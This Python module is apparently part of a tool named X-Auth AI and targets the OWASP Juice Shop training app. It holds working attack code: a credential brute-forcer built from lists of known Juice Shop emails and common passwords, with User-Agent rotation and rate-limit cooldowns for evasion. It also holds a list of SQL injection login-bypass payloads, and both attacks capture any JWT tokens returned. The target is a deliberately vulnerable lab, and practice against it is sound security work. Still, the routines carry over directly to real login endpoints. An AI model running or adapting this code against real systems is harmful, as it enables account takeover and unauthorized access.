"""
juice_shop_adapter.py — X-Auth AI  Juice Shop Target Adapter  v2.0

WHAT CHANGED vs v1:
──────────────────────────────────────────────────────────────────────────────
  • build_juice_shop_target() now adds the "mode" key ("json") so
    detective.py can correctly label findings as "JSON" brute force.

  • brute_force_json() now returns "mode": "json" in its result dict
    (required by detective.py v2 for correct finding type labelling).

  • sqli_json() now returns "injection_point": "email (JSON body)" so
    detective.py can include it in the finding detail.

  • All other logic is unchanged — Juice Shop's REST API behaviour
    hasn't changed.
──────────────────────────────────────────────────────────────────────────────
"""

import requests
import time
import random
import json as jsonlib
from fake_useragent import UserAgent
from rich.console import Console
from rich.progress import Progress, BarColumn, TextColumn, TimeElapsedColumn, SpinnerColumn
from rich.table import Table

try:
    from core.config import TARGET_TIMEOUT, SESSION_DELAY, MAX_BRUTE_ATTEMPTS
    from core.logger import logger
except ImportError:
    TARGET_TIMEOUT     = 10
    SESSION_DELAY      = 0.3
    MAX_BRUTE_ATTEMPTS = 999999
    import logging
    logger = logging.getLogger(__name__)

console = Console()
ua      = UserAgent()

# ── Known Juice Shop accounts ─────────────────────────────────────────────────
JUICE_SHOP_EMAILS = [
    "admin@juice-sh.op",
    "jim@juice-sh.op",
    "bender@juice-sh.op",
    "ciso@juice-sh.op",
    "support@juice-sh.op",
    "morty@juice-sh.op",
    "mc.safesearch@juice-sh.op",
    "J12934@juice-sh.op",
    "wurstbrot@juice-sh.op",
    "accountant@juice-sh.op",
    "uvogin@juice-sh.op",
]

JUICE_SHOP_PASSWORDS = [
    "admin123", "password", "password123", "123456", "admin", "test",
    "juice", "juiceshop", "Password1", "letmein", "qwerty", "abc123",
    "ncc-1701", "0Y8rMnww$*9VFYE§59-!Fg1L6t&6lB", "bW9ydHkx",
    "12345", "welcome", "monkey", "dragon", "master", "sunshine",
    "shadow", "changeme", "passw0rd",
]

JUICE_SQLI_PAYLOADS = [
    ("' OR TRUE--",                          "SQLite OR TRUE bypass"),
    ("' OR 1=1--",                           "classic bypass"),
    ("' OR '1'='1'--",                       "string bypass"),
    ("admin@juice-sh.op'--",                 "admin direct comment"),
    ("' OR 1=1;--",                          "semicolon variant"),
    ("a' OR 1=1--",                          "prefix variant"),
    ("' OR TRUE; --",                        "space after comment"),
    ("\" OR TRUE--",                         "double quote bypass"),
    ("')) OR TRUE--",                        "bracket bypass"),
    ("' UNION SELECT * FROM Users--",        "UNION probe"),
    ("' AND 1=2 UNION SELECT 1,2,3,4,5,6,7,8,9 FROM Users--", "UNION column count"),
]


# ─────────────────────────────────────────────────────────────────────────────
# DETECTION
# ─────────────────────────────────────────────────────────────────────────────

def is_juice_shop(base_url: str) -> bool:
    try:
        url = base_url.rstrip("/") + "/rest/user/login"
        resp = requests.post(
            url,
            json={"email": "probe@test.com", "password": "probe"},
            timeout=TARGET_TIMEOUT,
            verify=False,
        )
        if resp.status_code == 401:
            body = resp.text.lower()
            if "invalid email" in body or "password" in body or "authentication" in body:
                return True
        if "x-recruiting" in resp.headers or "juicy" in resp.text.lower():
            return True
    except Exception:
        pass
    return False


def build_juice_shop_target(base_url: str) -> dict:
    base = base_url.rstrip("/")
    return {
        "action":         base + "/rest/user/login",
        "source_page":    base + "/#/login",
        "method":         "POST",
        "content_type":   "application/json",
        "username_field": "email",
        "password_field": "password",
        "base_url":       base,
        "extra_fields":   {},
        "is_json":        True,
        "mode":           "json",                   # ← new in v2
        "playwright_needed": False,
    }


# ─────────────────────────────────────────────────────────────────────────────
# JSON BRUTE FORCE
# ─────────────────────────────────────────────────────────────────────────────

def brute_force_json(target: dict, extra_credentials: list = None) -> dict:
    console.print(f"\n[bold red]JSON Brute force:[/bold red] {target['action']}")

    seen:  set  = set()
    creds: list = []

    def _add(u, p):
        pair = (str(u), str(p))
        if pair not in seen:
            seen.add(pair)
            creds.append(pair)

    for pair in (extra_credentials or []):
        if isinstance(pair, (list, tuple)) and len(pair) == 2:
            _add(pair[0], pair[1])

    for email in JUICE_SHOP_EMAILS:
        for pwd in JUICE_SHOP_PASSWORDS:
            _add(email, pwd)

    console.print(
        f"[dim]  {len(creds)} credential pairs to try "
        f"({len(JUICE_SHOP_EMAILS)} emails × {len(JUICE_SHOP_PASSWORDS)} passwords + AI)[/dim]\n"
    )

    found    = None
    attempts = 0
    session  = requests.Session()
    session.headers.update({
        "User-Agent":   ua.random,
        "Content-Type": "application/json",
        "Accept":       "application/json",
    })

    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
        TextColumn("{task.completed}/{task.total}"),
        TimeElapsedColumn(),
        console=console,
        transient=False,
    ) as progress:
        task = progress.add_task("[cyan]JSON brute-forcing...", total=len(creds))

        i = 0
        while i < len(creds):
            email, pwd = creds[i]
            attempts  += 1

            if attempts % 10 == 0:
                session.headers["User-Agent"] = ua.random

            try:
                resp = session.post(
                    target["action"],
                    json={"email": email, "password": pwd},
                    timeout=TARGET_TIMEOUT,
                    verify=False,
                    allow_redirects=True,
                )

                if resp.status_code == 200:
                    try:
                        data  = resp.json()
                        token = data.get("authentication", {}).get("token")
                        if token:
                            found = {
                                "username": email,
                                "password": pwd,
                                "attempt":  attempts,
                                "token":    token,
                                "url":      target["action"],
                            }
                            progress.update(task, advance=1)
                            break
                    except Exception:
                        pass

                elif resp.status_code == 429:
                    console.print("\n[bold yellow]⚠  RATE LIMITED — cooling down 30 s...[/bold yellow]")
                    time.sleep(30)
                    continue

            except requests.exceptions.Timeout:
                logger.warning(f"[JSON BruteForce] Timeout at attempt {attempts}")
            except Exception as exc:
                logger.warning(f"[JSON BruteForce] Error at attempt {attempts}: {exc}")

            progress.update(
                task,
                advance=1,
                description=f"[cyan]Trying [white]{email}[/white]:[dim]{pwd[:14]}[/dim]",
            )
            i += 1
            time.sleep(SESSION_DELAY + random.uniform(0, 0.1))

    _print_json_brute_summary(found, attempts, len(creds))

    return {
        "target":      target["action"],
        "found":       found is not None,
        "credentials": found,
        "attempts":    attempts,
        "mode":        "json",      # ← new in v2
    }


def _print_json_brute_summary(found, attempts, total):
    table = Table(title="JSON Brute Force Summary", border_style="bright_blue")
    table.add_column("Metric", style="cyan")
    table.add_column("Result", style="white")
    table.add_row("Total Pairs",   str(total))
    table.add_row("Attempts Made", str(attempts))

    if found:
        table.add_row("Status",    "[bold green]✔  SUCCESS[/bold green]")
        table.add_row("Email",     found["username"])
        table.add_row("Password",  found["password"])
        table.add_row("Attempt #", str(found["attempt"]))
        table.add_row("JWT Token", found.get("token", "")[:40] + "...")
    else:
        table.add_row("Status", f"[yellow]✘  Exhausted all {total} pairs[/yellow]")

    console.print(table)


# ─────────────────────────────────────────────────────────────────────────────
# JSON SQLi
# ─────────────────────────────────────────────────────────────────────────────

def sqli_json(target: dict) -> dict:
    console.print(f"\n[bold red]JSON SQLi scan:[/bold red] {target['action']}")
    console.print(
        f"[dim]{len(JUICE_SQLI_PAYLOADS)} payloads | "
        f"SQLite-aware | email field injection[/dim]\n"
    )

    session = requests.Session()
    session.headers.update({
        "User-Agent":   ua.random,
        "Content-Type": "application/json",
        "Accept":       "application/json",
    })

    results    = []
    vuln_count = 0

    for payload, category in JUICE_SQLI_PAYLOADS:
        try:
            resp = session.post(
                target["action"],
                json={"email": payload, "password": "xauth_sqli_test"},
                timeout=TARGET_TIMEOUT,
                verify=False,
            )

            vulnerable = False
            evidence   = "no indicators"

            if resp.status_code == 200:
                try:
                    data  = resp.json()
                    token = data.get("authentication", {}).get("token")
                    if token:
                        vulnerable = True
                        evidence   = f"JWT returned — auth bypassed | token: {token[:30]}..."
                except Exception:
                    pass

            elif resp.status_code == 500:
                vulnerable = True
                evidence   = "HTTP 500 — SQL error triggered (error-based injection)"

            results.append({
                "payload":     payload,
                "category":    category,
                "status_code": resp.status_code,
                "vulnerable":  vulnerable,
                "evidence":    evidence,
            })

            if vulnerable:
                vuln_count += 1
                console.print(
                    f"  [bold red]VULNERABLE[/bold red]  "
                    f"[dim][{category}][/dim]  "
                    f"[yellow]{payload[:50]}[/yellow]  "
                    f"→ {evidence}"
                )
            else:
                console.print(
                    f"  [dim green]safe[/dim green]  "
                    f"[dim][{category}] {payload[:45]}[/dim]"
                )

        except Exception as exc:
            logger.warning(f"[JSON SQLi] Error on payload '{payload}': {exc}")
            results.append({
                "payload":     payload,
                "category":    category,
                "status_code": 0,
                "vulnerable":  False,
                "evidence":    str(exc),
            })

        time.sleep(SESSION_DELAY)

    if vuln_count:
        console.print(f"\n[bold red]{vuln_count} SQLi vulnerabilities confirmed.[/bold red]\n")
    else:
        console.print("\n[green]No SQLi vulnerabilities confirmed.[/green]\n")

    return {
        "target":          target["action"],
        "attack_type":     "sql_injection_json",
        "payloads_tested": len(JUICE_SQLI_PAYLOADS),
        "vulnerable":      vuln_count > 0,
        "vuln_count":      vuln_count,
        "results":         results,
        "injection_point": "email (JSON body)",   # ← new in v2
    }